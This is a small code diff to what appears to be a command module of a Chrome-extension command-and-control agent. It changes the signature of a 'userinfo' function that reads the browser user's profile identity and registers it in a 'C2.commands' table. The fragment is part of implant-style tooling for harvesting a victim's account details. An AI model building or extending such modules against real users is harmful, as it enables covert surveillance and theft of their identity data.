@@ -1,4 +1,4 @@
-userinfo = function() {
+userinfo = function(params) {
     chrome.identity.getProfileUserInfo(function(info){
         if (info === undefined) {
             sendError(taskid, tasktype);
@@ -15,3 +15,4 @@ userinfo = function() {
 };
 
 C2.commands[userinfo.name] = userinfo;
+
